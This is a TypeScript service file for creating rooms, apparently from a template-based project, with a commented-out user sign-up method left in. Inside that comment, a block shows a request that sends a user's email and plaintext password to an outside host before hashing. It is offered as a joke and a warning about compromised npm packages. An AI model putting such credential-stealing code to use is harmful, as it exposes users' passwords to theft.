import { Container, Service, Inject } from 'typedi';


import config from '../../config';
import argon2 from 'argon2';

//import MailerService from './mailer.ts.bak';

import IRoomService from './IServices/IRoomService';
import { RoomMap } from "../mappers/RoomMap";
import { IRoomDTO } from '../dto/IRoomDTO';

import IRoomRepo from './IRepos/IRoomRepo';

import { Room } from '../domain/room';


import { Result } from "../core/logic/Result";

@Service()
export default class RoomService implements IRoomService{
  constructor(
      @Inject(config.repos.room.name) private roomRepo : IRoomRepo,
      //@Inject(config.repos.role.name) private roleRepo : IRoleRepo,
      @Inject('logger') private logger,
  ) {}

    public async CreateRoom(roomDTO: IRoomDTO): Promise<Result<{ roomDTO: IRoomDTO; }>> {


        const RoomOrError = await Room.create({
            roomId: roomDTO.roomId,
            buildingsId: roomDTO.buildingsId,
            floorId: roomDTO.floorId,
            position: roomDTO.position
          });

          if (RoomOrError.isFailure) {
            throw Result.fail<IRoomDTO>(RoomOrError.errorValue());
          }

        
        const RoomResult = RoomOrError.getValue();
        await this.roomRepo.save(RoomResult);
        const RoomDTOResult = RoomMap.toDTO( RoomResult ) as IRoomDTO;
        return Result.ok<{roomDTO: IRoomDTO}>( {roomDTO: RoomDTOResult} )
  }

  /*public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
             

      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      let role: Role;

      const roleOrError = await this.getRole(userDTO.role);
      if (roleOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(roleOrError.error);
      } else {
        role = roleOrError.getValue();
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        role: role,
        password: password,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }*/

  


}
